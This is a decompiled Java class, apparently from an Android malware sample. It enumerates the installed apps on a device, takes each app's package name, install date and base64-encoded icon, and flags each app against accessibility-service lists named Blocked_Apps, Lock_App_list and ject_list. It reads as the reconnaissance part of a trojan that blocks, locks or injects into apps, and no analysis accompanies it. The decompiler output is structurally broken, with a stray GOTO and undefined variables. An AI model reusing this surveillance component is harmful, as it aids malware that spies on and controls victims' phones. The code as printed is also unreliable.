/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.content.pm.ApplicationInfo
 *  android.content.pm.PackageManager$NameNotFoundException
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.util.Base64
 */
package linker.resourcer.encoder;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.util.Date;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.AccessibilityServiceHelper;
import linker.resourcer.encoder.UtilityHelper;

public class InstalledAppsLoader {
    private static StringBuffer LoadApps = new StringBuffer();

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static String Load(Context var0) {
        block28: {
            block27: {
                var2_3 = "0";
                try {
                    if (InstalledAppsLoader.LoadApps.toString().length() != 0) {
                        InstalledAppsLoader.LoadApps = var3_4 /* !! */  = new StringBuffer();
                    }
                    var11_5 = var0 /* !! */ .getPackageManager();
                    var6_6 = var11_5.getInstalledApplications(128);
lbl7:
                    // 3 sources

                    for (ApplicationInfo var13_23 : var6_6) {
                        if (var11_5.getLaunchIntentForPackage(var13_23.packageName) == null || var11_5.getLaunchIntentForPackage(var13_23.packageName).equals("")) continue;
                        var3_4 /* !! */  = var11_5.getPackageInfo(var13_23.packageName, 4096);
                        var12_22 = new Date(var3_4 /* !! */ .firstInstallTime);
                        var3_4 /* !! */  = var11_5.getLaunchIntentForPackage(var13_23.packageName) != null ? ((var13_23.flags & 1) != 0 ? "System" : "User") : "null";
                        var4_9 = "1";
                        break block27;
                    }
                    break block28;
                }
                catch (Exception var0_2) {
                    // empty catch block
                    return null;
                }
            }
            try {
                var1_8 = AccessibilityServiceHelper.Blocked_Apps.contains(var13_23.packageName.toString().toLowerCase());
                if (var1_8) {
                    var4_9 = var2_3;
                }
                var7_14 = var4_9;
            }
            catch (Exception var7_15) {
                var7_14 = var4_9;
            }
            var4_9 = var2_3;
            try {
                var1_8 = AccessibilityServiceHelper.Lock_App_list.contains(var13_23.packageName.toString().toLowerCase());
                if (var1_8) {
                    var4_9 = "1";
                }
                var8_16 = var4_9;
            }
            catch (Exception var8_17) {
                var8_16 = var4_9;
            }
            var4_9 = var2_3;
            try {
                var1_8 = AccessibilityServiceHelper.Map_Name_ID.containsKey(var11_5.getApplicationLabel(var13_23));
                if (var1_8) {
                    var4_9 = "1";
                }
                var9_18 = var4_9;
            }
            catch (Exception var9_19) {
                var9_18 = var4_9;
            }
            var4_9 = var2_3;
            try {
                var1_8 = AccessibilityServiceHelper.ject_list.contains(var13_23.packageName.toString().toLowerCase());
                if (var1_8) {
                    var4_9 = "1";
                }
                var10_20 = var4_9;
            }
            catch (Exception var10_21) {
                var10_20 = var4_9;
            }
            {
                block30: {
                    block29: {
                        try {
                            var4_9 = UtilityHelper.drawableToBitmap(var0 /* !! */ .getPackageManager().getApplicationIcon(var13_23.packageName));
                        }
                        catch (PackageManager.NameNotFoundException var4_13) {
                            // empty catch block
                            break block29;
                        }
                        try {
                            var4_9 = Bitmap.createScaledBitmap((Bitmap)var4_9, (int)35, (int)35, (boolean)true);
                            var14_24 = new ByteArrayOutputStream();
                        }
                        catch (PackageManager.NameNotFoundException var4_12) {
                            break block29;
                        }
                        try {
                            var15_25 = Bitmap.CompressFormat.JPEG;
                        }
                        catch (PackageManager.NameNotFoundException var4_11) {
                            break block29;
                        }
                        try {
                            var4_9.compress((Bitmap.CompressFormat)var15_25, 50, (OutputStream)var14_24);
                            var4_9 = Base64.encodeToString((byte[])var14_24.toByteArray(), (int)2);
                            break block30;
                        }
                        catch (PackageManager.NameNotFoundException var4_10) {}
                    }
                    var4_9.printStackTrace();
                    var4_9 = "null";
                }
                var14_24 = InstalledAppsLoader.LoadApps;
                var15_25 = new StringBuilder();
                var14_24.append(var15_25.append((Object)var11_5.getApplicationLabel(var13_23)).append(ConfigurationConstants.SPLIT_ARAY).append((String)var3_4 /* !! */ ).append(ConfigurationConstants.SPLIT_ARAY).append(var13_23.packageName).append(ConfigurationConstants.SPLIT_ARAY).append(var12_22).append(ConfigurationConstants.SPLIT_ARAY).append(var4_9).append(ConfigurationConstants.SPLIT_ARAY).append(var7_14).append(ConfigurationConstants.SPLIT_ARAY).append(var8_16).append(ConfigurationConstants.SPLIT_ARAY).append(var9_18).append(ConfigurationConstants.SPLIT_ARAY).append(var10_20).append(ConfigurationConstants.SPLIT_LINE).toString());
                ** GOTO lbl7
            }
        }
        try {
            if (InstalledAppsLoader.LoadApps.toString().length() == 0) return null;
            return InstalledAppsLoader.LoadApps.toString();
        }
        catch (Exception var0_1) {
            return null;
        }
    }
}

